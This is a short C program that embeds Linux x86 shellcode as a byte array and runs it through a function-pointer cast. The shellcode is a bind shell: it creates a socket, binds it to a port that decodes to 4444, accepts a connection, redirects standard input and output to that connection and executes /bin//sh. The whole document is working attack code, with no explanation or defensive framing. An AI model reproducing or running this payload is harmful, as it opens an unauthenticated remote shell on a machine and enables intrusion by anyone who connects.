
char shellcode[] = "\x31\xc0\x50\xb0\x01\x50\xb0\x02\x50\xb0\x66\x31\xdb\xb3\x01\x89\xe1\xcd\x80\x89\xc7\x31\xc0\x50\x66\xc7\x44\x24\xfe\x11\x5c\xb0\x02\x66\x89\x44\x24\xfc\x83\xec\x04\x89\xe6\x6a\x10\x89\xe1\x56\x57\x89\xe1\x31\xdb\xb3\x02\x31\xc0\xb0\x66\xcd\x80\x31\xc0\xb0\x01\x50\x57\x89\xe1\x31\xdb\xb3\x04\x31\xc0\xb0\x66\xcd\x80\x51\x6a\x10\x54\x56\x57\x89\xe1\x31\xdb\xb3\x05\x31\xc0\xb0\x66\xcd\x80\x50\xcd\x80\x31\xc0\xb0\x3f\x5b\x31\xc9\xcd\x80\x31\xc0\xb0\x3f\xb1\x01\xcd\x80\x31\xc0\xb0\x3f\xb1\x02\xcd\x80\xeb\x16\x5b\x8b\x7b\x04\xc1\xef\x08\x89\x7b\x04\x31\xc0\x50\x89\xe2\xb0\x0b\x53\x89\xe1\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68";

int main()
{
	void (*shell)() = (void(*)())shellcode;
	shell();
	return 0;
}
